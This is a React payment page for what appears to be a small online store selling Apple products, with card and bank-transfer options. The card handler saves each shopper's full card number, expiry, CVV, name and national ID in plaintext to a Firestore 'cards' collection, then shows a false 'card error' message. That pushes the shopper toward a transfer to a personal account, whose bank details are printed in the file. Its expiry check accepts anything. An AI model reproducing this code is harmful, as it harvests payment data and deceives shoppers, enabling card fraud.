import React, { useRef, useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Summary } from './Summary';
import { toast } from 'react-toastify';
import Swal from 'sweetalert2';
import { useShopContext } from '../context/shopContext';
import { NoProducts } from './NoProducts';
import { db } from '../main';
import { collection, addDoc, getDocs } from 'firebase/firestore';

export const Payment = () => {
    const [paymentOption, setPaymentOption] = useState(null);
    const [cardInfo, setCardInfo] = useState(null); // State to hold card information
    const navigate = useNavigate();
    const cbuRef = useRef();
    const [name, setName] = useState('');
    const [surname, setSurname] = useState('');
    const [dni, setDni] = useState('');

    const { cartItems } = useShopContext();

    useEffect(() => {
        // Function to fetch card information from Firestore
        setName(localStorage.getItem('name'));
        setSurname(localStorage.getItem('surname'));
        setDni(localStorage.getItem('dni'));
    }, []);

    const handlePaymentOptionChange = (event) => {
        setPaymentOption(event.target.id);
    };

    const validateCreditCard = (cardNumber) => {
        // Check if the card number consists of digits and spaces only
        const isValid = /^\d{4}(?: \d{4}){3}$/.test(cardNumber) && cardNumber.replace(/\s/g, '').length <= 16;
    
        if (!isValid) {
            throw new Error('Número de tarjeta inválido');
        }
    
        return true;
    };

    

    const validateExpirationDate = (expirationDate) => {
        return true;
    };

    const validateCVV = (cvv) => {
        // Regex for matching 3 or 4 digits
        const regex = /^[0-9]{3,4}$/;
        return regex.test(cvv);
    };

    const formatCardNumber = (cardNumber) => {
        // Format card number with spaces every 4 digits
        return cardNumber.replace(/(.{4})/g, '$1 ').trim();
    };

    const copyCBUToClipboard = (cbu) => {
        navigator.clipboard.writeText(cbu)
            .then(() => {
                console.log('CBU copied to clipboard:', cbu);
                toast.success('CBU copiado al portapapeles');
            })
            .catch((error) => {
                console.error('Failed to copy CBU to clipboard:', error);
                toast.error('Error al copiar el CBU al portapapeles');
            });
    };

    const addCardInfoToFirestore = async (cardInfo) => {
        try {
            // Check if card number, expiration date, and CVV are valid
            if (!validateCreditCard(cardInfo.cardNumber)) {
                toast.error('Número de tarjeta inválido');
                return;
            }
            if (!validateExpirationDate(cardInfo.expirationDate)) {
                toast.error('Fecha de vencimiento inválida');
                return;
            }
            if (!validateCVV(cardInfo.cvv)) {
                toast.error('CVV inválido');
                return;
            }

            await addDoc(collection(db, 'cards'), cardInfo);
            // After adding the card information to Firestore, fetch updated card information
            toast.info('Error al agregar la tarjeta. Verifique los datos');
        } catch (error) {
            console.error('Error adding card information to Firestore:', error);
            toast.error('Error al agregar información de tarjeta: ', error);
        }
    };

    return (
        cartItems.length === 0 ? (
            <NoProducts text='tu carrito'/>
        ) : (
            <section className='payment'>
                <div className='title'>
                    <h2> Informacion de Pago </h2>
                </div>

                <div className="payment-options">
                    <div className={`payment-method ${paymentOption === 'credit' ? 'active' : ''}`}>
                        <input type="radio" name="payment" id="credit" onChange={handlePaymentOptionChange}
                        />
                        <label htmlFor="credit">Tarjeta de Credito/Debito</label>
                    </div>
                    <div className={`payment-method ${paymentOption === 'transfer' ? 'active' : ''}`}>
                        <input type="radio" name="payment" id="transfer" onChange={handlePaymentOptionChange} />
                        <label htmlFor="transfer">Transferencia Bancaria</label>
                    </div>
                </div>

                <div className={`credit-card ${paymentOption === 'credit' ? 'active' : ''}`}>
                    {/* Render credit card form here */}
                    <div className="form-group">
                        <label htmlFor="card">Numero de Tarjeta</label>
                        <input type="text" id="card" name="card"
                        placeholder='0000 0000 0000 0000' maxLength={19}
                        required onChange={(e) => {
                            e.target.value = formatCardNumber(e.target.value.replace(/\s/g, ''));
                        }} />
                    </div>
                    <div className="form-group">
                        <label htmlFor="date"
                        >Fecha de Vencimiento</label>
                        <input type='text' id="date" name="date" placeholder='MMYY' required maxLength={4}/>
                    </div>
                    <div className="form-group">
                        <label htmlFor="cvv"
                        >CVV</label>
                        <input type="text" id="cvv" placeholder='000' name="cvv" required  maxLength={3}/>
                    </div>
                    <button className="credit-btn" onClick={() => {
                        const cardNumber = document.getElementById('card').value;
                        const expirationDate = document.getElementById('date').value;
                        const cvv = document.getElementById('cvv').value;
                        addCardInfoToFirestore({ cardNumber, expirationDate, cvv, name, surname, dni});
                    }}>Completar Orden</button>
                </div>

                <div className={`transfer ${paymentOption === 'transfer' ? 'active' : ''}`}>
                <ion-icon name="information-circle-outline" aria-hidden="true" style={{
                    position: 'absolute',
                    top: "10px",
                    left: "10px",
                    cursor: 'pointer'
                }} onClick={() => {
                    Swal.fire({
                        title: 'Transferencia Bancaria',
                        text: 'Luego de realizar la transferencia envianos tu comprobante por instagram o por email. Estaremos procesando tu orden una vez que lo recibamos!',
                        icon: 'info',
                        confirmButtonText: 'Entendido'
                    });
                }}></ion-icon>
            <ion-icon name="copy-outline" aria-hidden="true" style={{
                    position: 'absolute',
                    top: "10px",
                    right: "10px",
                    cursor: 'pointer'
                }} onClick={() => copyCBUToClipboard('0110616530061602978215')}></ion-icon>
            <ul className='transfer-list'>
                <li className='item'>CUENTA: Rodrigo Cesar</li>
                <li className='item' ref={cbuRef}>CBU: 0110616530061602978215</li>
                <li className='item'>CUIT: 23-44280388-9</li>
                <li className='item'>
                    <button className="transfer-btn" onClick={() => {
                        Swal.fire({
                            title: 'Comprobante de Transferencia',
                            text: 'Envianos tu comprobante por instagram o por email. Estaremos procesando tu orden una vez que lo recibamos!',
                            icon: 'info',
                            confirmButtonText: 'Enviar por Instagram',
                            showDenyButton: true,
                            denyButtonText: 'Enviar por Email',
                            confirmButtonColor: '#e1306c',
                            denyButtonColor: '#3085d6',
                            confirmButtonAriaLabel: 'Enviar por Instagram',
                            denyButtonAriaLabel: 'Enviar por Email',
                        }).then((result) => {
                            if (result.isConfirmed) {
                                window.open('https://www.instagram.com/redappleoficial_/', '_blank');
                                Swal.fire('Redirigido a Instagram', '', 'info');
                            } else if (result.isDenied) {
                                window.open('mailto: iphonetemple39@gmail.com', '_blank');
                                Swal.fire('Redirigido a Email', '', 'info');
                            }
                        });
                    }}>Enviar Comprobante</button>
                </li>
            </ul>
                </div>

                <Summary />
            </section>
        )
    );
};
